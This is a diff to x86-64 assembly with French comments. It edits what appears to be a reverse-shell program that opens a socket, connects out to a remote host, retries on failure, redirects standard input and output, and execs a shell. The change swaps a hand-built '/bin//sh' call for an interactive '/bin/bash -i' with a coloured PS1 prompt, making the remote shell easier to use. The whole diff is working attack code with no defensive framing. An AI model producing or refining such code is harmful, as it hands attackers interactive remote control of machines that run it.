@@ -12,6 +12,14 @@ welcome_msg:
     db 0
 welcome_len equ $ - welcome_msg
 
+env_ps1: 
+    db 'PS1=\[\033[1;32m\]\w\[\033[0m\]\$ ',0  ; PS1 avec couleur verte
+
+bash_path:
+    db '/bin/bash', 0       ; Utiliser bash au lieu de sh
+
+bash_arg:
+    db '-i', 0              ; Argument pour mode interactif
 
 timespec:
     dd 5                    ; 5 secondes
@@ -26,11 +34,11 @@ _start:
 main:
     call create_socket
     test rax, rax
-    js error_handler        ; Vérification d'erreur socket
+    js error_handler
     
     call connect
     test rax, rax
-    js reconnect_if_fail    ; Vérification d'erreur connexion
+    js reconnect_if_fail
     
     call redir_io
     call shell
@@ -66,30 +74,32 @@ redir_loop:
     ret
 
 shell:
-shell:
-    ; Affichage message
+    ; Affichage message de bienvenue
     mov rax, 1              ; sys_write
-    mov rdi, 1              ; stdout (redirigé)
+    mov rdi, 1              ; stdout
     lea rsi, [rel welcome_msg]
     mov rdx, welcome_len
     syscall
 
-    ; Exécution shell avec PS1 personnalisé
-    xor rax, rax
-    push rax                ; NULL terminator
-    mov rbx, 0x68732f2f6e69622f  ; "/bin//sh"
-    push rbx
-    mov rdi, rsp            ; path
+    ; Construction environnement
+    lea rax, [rel env_ps1]  
+    push 0                  ; NULL terminator envp
+    push rax                ; Pointeur vers PS1
+    mov r8, rsp             ; Sauvegarder envp
+
+    ; Construction argv pour bash -i
+    push 0                  ; argv[2] = NULL
+    lea rax, [rel bash_arg] ; "-i"
+    push rax                ; argv[1] = "-i"
+    lea rax, [rel bash_path]; "/bin/bash" 
+    push rax                ; argv[0] = "/bin/bash"
     
-    ; Variables d'environnement
-    mov rax, 0x3d77243f24537d24  ; "PS1='\\w $ '"
-    push rax
-    lea rdx, [rsp]          ; envp
-    
-    xor rsi, rsi            ; argv = NULL
+    mov rdi, rax            ; path = "/bin/bash"
+    mov rsi, rsp            ; argv = ["/bin/bash", "-i", NULL]
+    mov rdx, r8             ; envp = [PS1, NULL]
     mov rax, 59             ; execve
     syscall
-
+    ret
 
 error_handler:
     mov rax, 3              ; syscall close
